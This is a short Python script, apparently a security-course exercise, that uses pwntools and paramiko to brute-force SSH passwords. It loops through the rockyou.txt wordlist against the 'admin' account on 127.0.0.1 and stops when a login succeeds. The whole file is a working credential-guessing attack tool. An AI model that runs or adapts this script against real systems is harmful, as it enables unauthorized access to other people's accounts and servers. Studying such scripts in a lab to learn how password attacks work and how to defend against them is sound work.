from pwn import *
import paramiko

target = "127.0.0.1"
username = "admin"
port = 22
attempts = 1
password_file = "/home/osboxes/code/tcmsec_python/env/rockyou.txt"

with open(password_file, "r") as file:
    for password in file:
        password = password.strip("\n")
        try:
            session = ssh(host=target, user=username, password=password, port=port, timeout=0.1)
            if session.connected():
                print(f"[>] Login successful with user:{password}")
                session.close()
                break
            else:
                print("[X] Invalid Password")
                session.close()
        except paramiko.AuthenticationException:
            print("[X] Invalid Password!")
        attempts += 1

